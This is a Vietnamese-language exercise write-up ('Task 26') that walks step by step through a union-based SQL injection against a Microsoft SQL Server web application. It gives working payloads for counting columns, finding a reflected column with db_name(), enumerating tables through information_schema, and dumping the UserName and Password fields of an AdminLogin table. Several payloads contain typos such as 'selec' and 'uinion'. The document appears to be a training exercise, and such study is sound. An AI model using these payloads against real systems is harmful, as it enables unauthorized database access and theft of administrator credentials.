# Task 26

> Tên tài liệu: MSSQL Union Based Injection
> Thực hiện: Nguyễn Minh Nhật

> Cập nhật lần cuối: 12/03/2017

## Mục lục:

[1.Cách tấn công cơ bản vào MSSQL.](#baocao)

## Nội dung.

<a name="baocao"></a>

### 1.Cách tấn công cơ bản vào MSSQL.

**B1**: Đầu tiên ta cũng sử dụng `'` để check lỗi và `order by` để tìm số cột.

- Ta thu được kết quả web này có 8 cột

**B2**: Ta `union select` để tìm cột lỗi: `union selec 1,2,3,4,5,6,7,8--`

- Nhận được 1 thông báo lỗi như hình.

<img src="http://sv1.upsieutoc.com/2017/03/12/1.png"/>

- Ta sẽ bypass nó bằng cách thay các sô bằng `null`: `union select null,null,null,null,null,null,null,null--`

- Nhận được thông báo lỗi

<img src="http://sv1.upsieutoc.com/2017/03/12/1e6fcc.png"/>

- Gỉa pháp là: `union all select`, nhận được thông báo lỗi.

<img src="http://sv1.upsieutoc.com/2017/03/12/178952.png"/>

- Giai pháp cho lỗi này là ta chuyển đổi từng cột, đặt function `db_name()` vào từng cột để tìm cột lỗi

- Ta đặt vào từng vị trí như sau:

```javascript
db_name(),2,3,4,5,6,7,8 -> Lỗi 
1,db_name(),3,4,5,6,7,8 -> Lỗi
1,2,db_name(),4,5,6,7,8 -> Lỗi
1,2,3,db_name(),5,6,7,8 -> Lỗi
1,2,3,4,db_name(),6,7,8 -> Lỗi
1,2,3,4,5,db_name(),7,8 -> Lỗi
1,2,3,4,5,6,db_name(),8 -> trang load và hiện cột lỗi là `2` như hình.
1,2,3,4,5,6,7,db_name() -> Lỗi
```

<img src="http://sv1.upsieutoc.com/2017/03/12/18674a.png"/>

**B3**: Tiến hành khai thác các thông tin cần thiết trên cột lỗi.

- Version:

<img src="http://sv1.upsieutoc.com/2017/03/12/173c05.png"/>

- Tìm các Table:

- Cú pháp có khác với SQLi: `and 1=0 union all select 1,table_name,3,4,5,6,7,8 from (select top 1 table_name from information_schema.tables order by 1) as shit order by 1 desc--`

- Ta thu được kết quả như hình:

<img src="http://sv1.upsieutoc.com/2017/03/12/14d019.png"/>

- Thay đổi tham số `top` để get tới các table có trong CSDL, ở đây ta quan tâm đến table `AdminLogin`.

- Lấy thông tin từ các `Column` trong table.

- Quan tâm cột `UserName`, `Password`

<img src="http://sv1.upsieutoc.com/2017/03/12/2.png"/>

<img src="http://sv1.upsieutoc.com/2017/03/12/14cce5.png"/>

- Lấy dữ liệu từ các cột: `uinion all select 1,Username%2b''%2bPassword,3,4,5,6,db_name(),8 from AdminLogin--`


<img src=""/>
<img src=""/>

